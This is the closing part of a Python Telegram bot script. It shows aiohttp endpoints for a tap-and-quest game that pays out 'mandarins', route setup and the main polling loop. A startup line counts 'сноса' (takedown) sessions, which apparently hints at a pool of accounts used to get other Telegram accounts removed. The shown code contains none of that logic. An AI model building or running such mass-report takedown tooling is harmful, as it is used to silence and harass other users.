        if qid not in QUESTS:return api_json({"error":"unknown_quest"},400)
        conn=sqlite3.connect(DB_PATH);conn.row_factory=sqlite3.Row;cur=conn.cursor();cur.execute("SELECT completed,claimed FROM quest_progress WHERE user_id=? AND quest_id=?",(uid,qid));row=cur.fetchone()
        if not row or row[0]!=1 or row[1]!=0:conn.close();return api_json({"error":"quest_not_ready"},400)
        reward=QUESTS[qid]["reward"];cur.execute("UPDATE quest_progress SET claimed=1 WHERE user_id=? AND quest_id=?",(uid,qid));cur.execute("UPDATE users SET mandarins=mandarins+? WHERE user_id=?",(reward,uid));conn.commit();conn.close();d=game_row(uid);return api_json({"ok":True,"reward":reward,"game":api_payload(d)["game"]})
    except Exception as e:return api_json({"error":str(e)},400)

async def api_profile(request):
    try:
        u=api_user(request); d=game_row(int(u["id"]));return api_json({"ok":True,**api_payload(d)})
    except Exception as e:return api_json({"error":str(e)},401)

async def start_game_api():
    app=aiohttp.web.Application()
    app.router.add_route("OPTIONS", "/{tail:.*}", api_options)
    app.router.add_get("/api/bootstrap", api_bootstrap)
    app.router.add_get("/api/profile", api_profile)
    app.router.add_get("/api/leaderboard", api_leaderboard)
    app.router.add_post("/api/tap", api_tap)
    app.router.add_post("/api/buy", api_buy)
    app.router.add_post("/api/case/open", api_case)
    app.router.add_post("/api/clan/create", api_clan_create)
    app.router.add_post("/api/daily/claim", api_daily)
    app.router.add_post("/api/quest/claim", api_quest)
    runner=aiohttp.web.AppRunner(app); await runner.setup()
    site=aiohttp.web.TCPSite(runner, MINIAPP_API_HOST, MINIAPP_API_PORT); await site.start()
    print(f"🍊 Mini App API: http://{MINIAPP_API_HOST}:{MINIAPP_API_PORT}")
    if MINIAPP_API_PUBLIC_URL: print(f"🍊 Public API URL: {MINIAPP_API_PUBLIC_URL}")
    return runner

async def main() -> None:
    print(f"🚀 Бот запущен! Админы: {ADMIN_IDS}")
    print(f"Сессий USA: {len(usa_session_meta)} | Сессий сноса: {len(destroy_session_meta)}")
    runner = await start_game_api()
    try:
        await bot.infinity_polling(skip_pending=True)
    finally:
        await runner.cleanup()

if __name__ == "__main__":
    asyncio.run(main())